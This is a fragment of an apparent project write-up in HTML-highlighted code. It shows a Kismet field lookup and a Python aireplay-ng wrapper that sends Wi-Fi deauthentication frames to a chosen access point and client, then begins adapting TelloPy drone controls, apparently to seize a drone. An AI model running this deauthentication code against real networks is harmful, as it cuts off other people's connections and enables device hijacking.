        ...
        {\r
            ...
            data: {\r
                fields: [\r
                    ...
                    <span class="hljs-string">&quot;dot11.device/dot11.device.associate_ssid_map&quot;</span>\r
                ],\r
            },\r
            ...(Option || []),\r
        },\r
...
\r
\r
<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deauth</span><span class="hljs-params">(interface, macaddr, cliaddr)</span>:</span>\r
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> AireplayNg() <span class="hljs-keyword">as</span> aireplay:\r
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> aireplay(interface, deauth=<span class="hljs-number">10</span>, D=<span class="hljs-literal">True</span>, a=macaddr, c=cliaddr):\r
            <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)\r
\r
<span class="hljs-comment"># Usage:</span>\r
<span class="hljs-comment"># asyncio.run(deauth(&#39;wlan_card_mon&#39;,&#39;kismet.device.base.macaddr&#39;,&#39;dot11.device/dot11.device.associate_ssid_map&#39;))</span>\r
...
</div></code></pre><p><strong>TelloPy</strong> gave a game controller stick mapper (function <code>__send_stick_command</code>) to control drone, so I motif it to adapt T1d: </p><pre class="hljs"><code><div><span class="hljs-comment"># Python</span>\r
